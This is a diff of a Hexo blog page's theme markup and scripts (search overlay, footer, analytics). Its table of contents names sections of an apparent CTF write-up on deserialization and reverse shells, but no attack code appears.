-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-scrapy"><span class="toc-text">easy_scrapy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Python反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%86%E8%A7%A3exp"><span class="toc-text">拆解exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">gopher协议</span></a></li></ol></li></ol></li></ol>
     </div>
   </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/slug01sh">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="mailto:slug01sh@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
 </div>
-    
 
-    
-  </main>
+      </div>
 
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
 
-    
+
+<script src="/js/backtotop.js"></script>
+
+
+
       
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
   </div>
 
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
 
-  
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
 
-  
-</footer>
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
 
-<!-- SCRIPTS -->
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
 
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      var inputArea = document.querySelector("#local-search-input");
-      inputArea.onclick = function () {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-        this.onclick = null
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
       }
-    })()
-  </script>
+    }
 
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
 
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
 
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
 
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
 
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
 
+                  if (start < 0) {
+                    start = 0;
+                  }
 
+                  if (start == 0) {
+                    end = 100;
+                  }
 
+                  if (end > content.length) {
+                    end = content.length;
+                  }
 
-  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js" ></script>
-  <script>
-    if (window.mermaid) {
-      mermaid.initialize({"theme":"default"});
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
     }
   </script>
 
 
 
 
-  
-
-  
-    <!-- Google Analytics -->
-    <script defer>
-      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
-      ga.l = +new Date;
-      ga('create', 'G-WTRCMZDFLE', 'auto');
-      ga('send', 'pageview');
-    </script>
-    <script async src='https://www.google-analytics.com/analytics.js'></script>
-  
-
-  
-    <!-- Google gtag.js -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
-    <script defer>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-WTRCMZDFLE');
-    </script>
-  
-
-  
-
-  
-
-  
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-
-</body>
+    </div>
+  </body>
 </html>
